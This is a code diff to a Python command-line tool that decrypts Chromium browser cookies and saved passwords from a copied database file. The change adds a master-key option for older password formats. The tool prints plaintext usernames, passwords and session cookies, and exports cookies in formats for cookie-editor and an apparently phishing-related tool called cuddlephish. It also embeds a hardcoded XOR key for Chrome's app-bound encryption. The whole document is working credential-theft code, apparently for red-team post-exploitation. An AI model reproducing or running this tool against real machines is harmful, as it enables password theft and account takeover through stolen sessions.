@@ -9,7 +9,7 @@ import json
 from datetime import datetime, timedelta
 from pyasn1.codec.der import decoder
 
-def cookies(key, file_location):
+def cookies(key, master_key, file_location):
     if os.path.isfile(file_location) == False:
         print("Error: File does not exist")
         sys.exit(1)
@@ -22,7 +22,7 @@ def cookies(key, file_location):
             print("Host: " + host_key)
             print("Path: " + path)
             print("Name: " + name)
-            print("Cookie: " + decrypt_data(encrypted_value,key, False) + ";")
+            print("Cookie: " + decrypt_data(encrypted_value,key, master_key, False) + ";")
             print("Expires: " + (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).strftime('%b %d %Y %H:%M:%S')) if has_expires else -1
             print("")
     except sqlite3.Error as e:
@@ -30,7 +30,7 @@ def cookies(key, file_location):
         print(e)
         sys.exit(1)
 
-def cookies_for_editor(key, file_location):
+def cookies_for_editor(key, master_key, file_location):
     cookies = []
     if os.path.isfile(file_location) == False:
         print("Error: File does not exist")
@@ -41,7 +41,7 @@ def cookies_for_editor(key, file_location):
         cursor.execute('select host_key, "TRUE", path, "FALSE", expires_utc, has_expires, name, CAST(encrypted_value AS BLOB) from cookies')
         values = cursor.fetchall()
         for host_key, _, path, _, expires_utc, has_expires, name, encrypted_value in values:
-            decrypted_value = decrypt_data(encrypted_value, key, False)
+            decrypted_value = decrypt_data(encrypted_value, key, master_key, False)
             expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
             cookie = {
                 "domain": host_key,
@@ -66,7 +66,7 @@ def cookies_for_editor(key, file_location):
         print(e)
         sys.exit(1)
 
-def login_data(key, file_location):
+def login_data(key, master_key, file_location):
     if os.path.isfile(file_location) == False:
         print("Error: File does not exist")
         sys.exit(1)
@@ -78,14 +78,14 @@ def login_data(key, file_location):
         for origin_url, username_value, password_value in values:
             print("URL: " + origin_url)
             print("Username: " + username_value)
-            print("Password: " + decrypt_data(password_value, key, True))
+            print("Password: " + decrypt_data(password_value, key,master_key, True))
             print("")
     except sqlite3.Error as e:
         print("Error: Could not connect to database")
         print(e)
         sys.exit(1)
 
-def cookies_for_cuddlephish(key, file_location):
+def cookies_for_cuddlephish(key, master_key, file_location):
     cookies = []
     if os.path.isfile(file_location) == False:
         print("Error: File does not exist")
@@ -98,7 +98,7 @@ def cookies_for_cuddlephish(key, file_location):
         values = cursor.fetchall()
         
         for creation_utc, host_key, top_frame_site_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, last_update_utc, source_type, has_cross_site_ancestor in values:
-            decrypted_value = decrypt_data(encrypted_value, key)
+            decrypted_value = decrypt_data(encrypted_value, key, master_key, False)
             expiration_date = (datetime(1601, 1, 1) + timedelta(microseconds=expires_utc)).timestamp() if has_expires else -1
         
             samesite_map = {0: "None", 1: "Lax", 2: "Strict"}
@@ -136,11 +136,18 @@ def cookies_for_cuddlephish(key, file_location):
         print(e)
         sys.exit(1)
 
-def decrypt_data(encrypted_junk, key, password=False):
+def decrypt_data(encrypted_junk, key, master_key=None, password=False):
     #key = binascii.unhexlify(key)
     version = encrypted_junk[:3]
     if version in (b'v10', b'v11'):
         try:
+            if password:
+                initialisation_vector = encrypted_junk[3:15]
+                encrypted_password = encrypted_junk[15:-16]
+                cipher = AES.new(master_key, AES.MODE_GCM, initialisation_vector)
+                decrypted_pass = cipher.decrypt(encrypted_password)
+                decrypted_pass = decrypted_pass.decode()
+                return decrypted_pass
             nonce = encrypted_junk[3:3 + 12]
             if len(nonce) == 0:
                 print("Error: Nonce cannot be empty")
@@ -154,7 +161,7 @@ def decrypt_data(encrypted_junk, key, password=False):
             print("Error: Could not decrypt password")
             print(e)
             return ""
-    if version in (b'v20'):    
+    if version in (b'v20'):
         try:
             nonce = encrypted_junk[3:3 + 12]
             if len(nonce) == 0:
@@ -176,28 +183,36 @@ def decrypt_data(encrypted_junk, key, password=False):
 def byte_xor(ba1, ba2):
     return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
 
+def decode_cli_key(s):
+    if s is None:
+        return None
+    base64_key = base64.b64encode(s.encode())
+    # Convert string with \x.. into pure hex and unhexlify
+    as_txt = base64.b64decode(base64_key).decode('utf-8').replace('\\x', '')
+    return binascii.unhexlify(bytearray(as_txt, 'utf-8'))
+
 def argparse_args():
     parser = argparse.ArgumentParser(description='Decrypt Chromium cookies and passwords given a key and DB file')
     parser.add_argument('-k', '--key', help='Decryption key', required=True)
     parser.add_argument('-o','--option', choices=['cookies', 'passwords', 'cookie-editor', 'cuddlephish', 'firefox'], help='Option to choose', required=True)
     parser.add_argument('-f','--file', help='Location of the database file', required=True)
     parser.add_argument('--chrome-aes-key',help='Chrome AES Key',required=False)
+    parser.add_argument('-mk','--master-key', help='Old key used in v10 passwords', required=False)
     return parser.parse_args()
 
 def main():
     args = argparse_args()
-    key = args.key
-    base64_key = base64.b64encode(key.encode())
     option = args.option
     file_location = args.file
     chromeAES = args.chrome_aes_key
     if chromeAES:
         base64ChromeKey = base64.b64encode(chromeAES.encode())
-    
-    key = bytearray(base64.b64decode(base64_key).decode('utf-8').replace('\\x', ''), 'utf-8')
+    master_key = decode_cli_key(args.master_key) if args.master_key else None
+
+    key = decode_cli_key(args.key)
     # if key len is not 32, then its chrome 127+
     # https://github.com/runassu/chrome_v20_decryption/issues/14#issuecomment-2708796234 
-    key = binascii.unhexlify(key)
+    #key = binascii.unhexlify(key)
 
     if (chromeAES):
         chromeKey = bytearray(base64.b64decode(base64ChromeKey).decode('utf-8').replace('\\x', ''), 'utf-8')
@@ -205,7 +220,6 @@ def main():
 
         xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
         xored_aes_key = byte_xor(chromeKey, xor_key)
-
 
     #print(len(key))
     if len(key) > 32:
@@ -232,13 +246,13 @@ def main():
         print("Decrypted App Bound Key: " + ''.join(f'\\x{b:02X}' for b in key) + "\n")
 
     if option == "cookies":
-        cookies(key, file_location)
+        cookies(key, master_key, file_location)
     elif option == "passwords":
-        login_data(key, file_location)
+        login_data(key, master_key, file_location)
     elif option == "cookie-editor":
-        cookies_for_editor(key, file_location)
+        cookies_for_editor(key, master_key, file_location)
     elif option == "cuddlephish":
-        cookies_for_cuddlephish(key, file_location)
+        cookies_for_cuddlephish(key, master_key, file_location)
     elif option == "firefox":
         print("TO DO")
     else:
